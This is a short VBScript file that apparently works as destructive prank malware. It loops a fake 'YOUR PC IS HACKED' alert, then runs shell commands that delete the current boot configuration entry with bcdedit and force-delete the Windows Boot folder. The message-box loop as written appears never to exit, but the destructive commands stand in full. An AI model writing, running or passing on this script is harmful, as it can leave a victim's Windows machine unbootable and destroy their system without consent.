Dim x
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
x=1
Do While x<>10
    x=msgbox ("YOUR PC IS HACKED" ,2+16, "your mbr is destroyed")
Loop
objShell.run("bcdedit /delete {current}")
objShell.run("del /s /q /f %windir%/Boot")
objShell.run("winver")
objShell.run("explorer")
objShell.run("start .")
